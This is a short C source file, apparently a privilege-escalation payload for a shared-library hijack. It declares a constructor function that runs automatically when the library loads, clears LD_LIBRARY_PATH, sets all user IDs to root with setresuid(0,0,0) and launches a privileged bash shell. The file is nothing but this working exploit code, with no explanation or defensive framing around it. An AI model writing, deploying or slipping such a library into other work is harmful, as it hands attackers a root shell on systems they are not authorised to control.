#include <stdio.h>
#include <stdlib.h>

static void spoilme() __attribute__((constructor));

void spoilme() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
